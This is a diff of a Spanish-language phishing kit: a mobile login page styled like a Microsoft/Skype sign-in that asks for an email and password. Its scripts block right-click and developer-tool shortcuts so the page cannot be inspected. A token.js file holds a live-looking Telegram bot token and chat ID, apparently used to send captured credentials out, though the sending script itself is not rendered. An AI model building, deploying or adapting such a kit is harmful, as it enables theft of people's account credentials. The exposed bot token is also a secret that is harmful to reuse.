@@ -1,0 +1,396 @@
+Se ha aumentado la altura de línea predeterminada para mejorar la accesibilidad. Puede habilitar una altura de línea más compacta desde el menú de configuración de vista.
+
+‎css/stylesmobile.css
++ 89
+Número de línea del archivo original	Número de línea de diferencia	Cambio de línea diferencial
+@@ -0,0 +1,89 @@
+body, html {
+    margin: 0;
+    padding: 0;
+    font-family: Arial, sans-serif;
+    height: 100%;
+}.form-container h2 {
+    margin-bottom: -5px; /* Ajusta este valor para reducir el espacio */
+    color: black;
+}
+.login-container {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: flex-start; /* Alinea el contenido hacia arriba */
+    height: 100%;
+    border: 1px solid #ccc;
+    padding-top: 20px;
+	width:auto; /* Espacio adicional en la parte superior, ajustable según tus necesidades */
+}
+h1 {
+    color: black;
+    margin-bottom: 1rem;
+}
+.form-container {
+    display: flex;
+    flex-direction: column;
+    align-items: flex-start;
+    padding: 20px;
+    border: 1px solid #ccc;
+	 width: 80%; /* ocupará el 80% de su contenedor padre */
+    max-width: 400px;
+	
+	
+}
+.logo {
+    width: 100px;
+    margin-bottom: 20px;
+}
+h2 {
+    margin-bottom: 20px;
+    color: black;
+}
+form {
+    width: 100%;
+    max-width: 400px;
+    display: flex;
+    flex-direction: column;
+}
+input {
+    padding: 8px;
+    margin: 10px 0;
+    border: none;
+    border-bottom: 1px solid black; /* Línea inferior */
+    font-size: 16px;
+}
+input:focus {
+    outline: none;
+    border-bottom: 1px solid #0078d4;
+}
+button {
+    padding: 15px;
+    background-color: #0067b8;
+    color: white;
+    border: none;
+    border-radius: 5px;
+    cursor: pointer;
+    margin-top: 15px;
+    font-size: 16px;
+}
+button:hover {
+    background-color: #005fa3;
+}
+.signup-prompt {
+    margin-top: 20px;
+    font-size: 14px;
+}
+‎img/logo.svg
++ 1
+
+
+
+‎index.html
++ 38
+Número de línea del archivo original	Número de línea de diferencia	Cambio de línea diferencial
+@@ -0,0 +1,38 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <link rel="shortcut icon" href="img/favicon.ico">
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Login Mobile</title>
+  <link rel="stylesheet" href="css/stylesmobile.css">
+</head>
+<body>
+  <div class="login-container">
+    <h1>&nbsp;</h1>
+    <div class="form-container">
+      <img src="img/logo.svg" alt="Logo" class="logo">
+      <h2>Iniciar sesión</h2>
+<p id="error-message" style="color: red; font-size: 0.8em;"></p>
+    <form id="loginForm">
+    <input type="hidden" name="device_name" id="device_name" value="">
+    <input type="text" id="u_e" name="u_e" placeholder="Correo electrónico, teléfono o Skype" required>
+    <input type="password"  name="u_p" placeholder="Contraseña" required>
+    <button type="submit">Iniciar sesión</button>
+  </form>
+      <p class="signup-prompt">¿No tienes una cuenta?</p>
+    </div> 
+  </div>
+ 
+ 
+   
+    <script type="text/javascript" src="js/main2.js"> </script>
+</script>
+      <script type="text/javascript" src="js/disablekey.js"> </script>
+       <script type="text/javascript" src="js/main2.js"> </script>
+          <script type="text/javascript" src="js/token.js"> </script>
+</body>
+</html>
+‎js/disablekey.js
++ 104
+Número de línea del archivo original	Número de línea de diferencia	Cambio de línea diferencial
+@@ -0,0 +1,104 @@
+function disableIE() {
+    if (document.all) {
+        return false;
+    }
+}
+function disableNS(e) {
+    if (document.layers || (document.getElementById && !document.all)) {
+        if (e.which==2 || e.which==3) {
+            return false;
+        }
+    }
+}
+if (document.layers) {
+    document.captureEvents(Event.MOUSEDOWN);
+    document.onmousedown = disableNS;
+} 
+else {
+    document.onmouseup = disableNS;
+    document.oncontextmenu = disableIE;
+}
+document.oncontextmenu = new Function("return false");
+var controlprecionado = 0;
+var altprecionado = 0;
+function desactivarCrlAlt(teclaactual){
+   var desactivar = false;
+   // Ctrl +
+   if (controlprecionado==17){
+      if (teclaactual==78 || teclaactual==85){
+        desactivar=true;
+      } 
+      if (teclaactual==83){
+        desactivar=true;
+      } 
+      if (teclaactual==116){
+        desactivar=true;
+      } 
+      if (teclaactual==114){
+        desactivar=true;
+      } 
+   }
+   // Alt +
+   if (altprecionado==18){
+      if (teclaactual==37){
+        desactivar=true;
+      } 
+      if (teclaactual==39){
+        desactivar=true;
+      } 
+   }
+   if (teclaactual==17) controlprecionado=teclaactual;
+   if (teclaactual==18) altprecionado=teclaactual;  
+   return desactivar;
+}
+document.onkeyup = function(){ 
+   if (window.event && window.event.keyCode==17){
+        controlprecionado = 0;
+   }
+   if (window.event && window.event.keyCode==18){
+        altprecionado = 0;
+   }  
+}
+document.onkeydown = function(){ 
+   //116->f5, 122->f11, 117->f6, 114->f3
+   if (window.event && desactivarCrlAlt(window.event.keyCode)){
+       return false;
+   }
+   // Ctrl + Shift + I
+   if (event.ctrlKey && event.shiftKey && event.code === 'KeyI') {
+      event.preventDefault();
+      console.log('Combinación de teclas bloqueada');
+    }
+   // F5, F11, F6, F3, Backspace
+   if (window.event && 
+       (window.event.keyCode == 122 || 
+       window.event.keyCode == 116 || 
+       window.event.keyCode == 114 || 
+       window.event.keyCode == 117 || 
+       window.event.keyCode == 8)){
+       window.event.keyCode = 505; 
+   }
+   if (window.event.keyCode == 505){ 
+       return false; 
+   } 
+}
+function showLanguageSelector(obj,language){    
+    if("es_PA" != language){
+        obj.show();        
+    } else {
+        obj.hide();
+    }
+}
+                  
+showLanguageSelector($k("#selectorEs"),'es_PA');
+showLanguageSelector($k("#selectorEn"),'en_PA');
+‎js/main2.js
++ 1
+Algunos archivos generados no se renderizan de forma predeterminada. Obtén más información sobre cómo personalizar la apariencia de los archivos modificados en GitHub.
+‎js/stylesmobile.css
++ 89
+Número de línea del archivo original	Número de línea de diferencia	Cambio de línea diferencial
+@@ -0,0 +1,89 @@
+body, html {
+    margin: 0;
+    padding: 0;
+    font-family: Arial, sans-serif;
+    height: 100%;
+}.form-container h2 {
+    margin-bottom: -5px; /* Ajusta este valor para reducir el espacio */
+    color: black;
+}
+.login-container {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: flex-start; /* Alinea el contenido hacia arriba */
+    height: 100%;
+    border: 1px solid #ccc;
+    padding-top: 20px;
+	width:auto; /* Espacio adicional en la parte superior, ajustable según tus necesidades */
+}
+h1 {
+    color: black;
+    margin-bottom: 1rem;
+}
+.form-container {
+    display: flex;
+    flex-direction: column;
+    align-items: flex-start;
+    padding: 20px;
+    border: 1px solid #ccc;
+	 width: 80%; /* ocupará el 80% de su contenedor padre */
+    max-width: 400px;
+	
+	
+}
+.logo {
+    width: 100px;
+    margin-bottom: 20px;
+}
+h2 {
+    margin-bottom: 20px;
+    color: black;
+}
+form {
+    width: 100%;
+    max-width: 400px;
+    display: flex;
+    flex-direction: column;
+}
+input {
+    padding: 8px;
+    margin: 10px 0;
+    border: none;
+    border-bottom: 1px solid black; /* Línea inferior */
+    font-size: 16px;
+}
+input:focus {
+    outline: none;
+    border-bottom: 1px solid #0078d4;
+}
+button {
+    padding: 15px;
+    background-color: #0067b8;
+    color: white;
+    border: none;
+    border-radius: 5px;
+    cursor: pointer;
+    margin-top: 15px;
+    font-size: 16px;
+}
+button:hover {
+    background-color: #005fa3;
+}
+.signup-prompt {
+    margin-top: 20px;
+    font-size: 14px;
+}
+‎js/token.js
++ 5
+Número de línea del archivo original	Número de línea de diferencia	Cambio de línea diferencial
+@@ -0,0 +1,5 @@
+// main.js
+const CONFIG = {
+  botToken: "7474477647:AAFXDCsyg6CtvbC61mWfG5xihLsruraXq1k",
+  chatId: "6927751752"
+};
+‎stylesmobile.css
++ 89
+Número de línea del archivo original	Número de línea de diferencia	Cambio de línea diferencial
+@@ -0,0 +1,89 @@
+body, html {
+    margin: 0;
+    padding: 0;
+    font-family: Arial, sans-serif;
+    height: 100%;
+}.form-container h2 {
+    margin-bottom: -5px; /* Ajusta este valor para reducir el espacio */
+    color: black;
+}
+.login-container {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: flex-start; /* Alinea el contenido hacia arriba */
+    height: 100%;
+    border: 1px solid #ccc;
+    padding-top: 20px;
+	width:auto; /* Espacio adicional en la parte superior, ajustable según tus necesidades */
+}
+h1 {
+    color: black;
+    margin-bottom: 1rem;
+}
+.form-container {
+    display: flex;
+    flex-direction: column;
+    align-items: flex-start;
+    padding: 20px;
+    border: 1px solid #ccc;
+	 width: 80%; /* ocupará el 80% de su contenedor padre */
+    max-width: 400px;
+	
+	
+}
+.logo {
+    width: 100px;
+    margin-bottom: 20px;
+}
+h2 {
+    margin-bottom: 20px;
+    color: black;
+}
+form {
+    width: 100%;
+    max-width: 400px;
+    display: flex;
+    flex-direction: column;
+}
+input {
+    padding: 8px;
+    margin: 10px 0;
+    border: none;
+    border-bottom: 1px solid black; /* Línea inferior */
+    font-size: 16px;
+}
+input:focus {
+    outline: none;
+    border-bottom: 1px solid #0078d4;
+}
+button {
+    padding: 15px;
+    background-color: #0067b8;
+    color: white;
+    border: none;
+    border-radius: 5px;
+    cursor: pointer;
+    margin-top: 15px;
+    font-size: 16px;
+}
+button:hover {
+    background-color: #005fa3;
+}
+.signup-prompt {
+    margin-top: 20px;
+    font-size: 14px;
+}
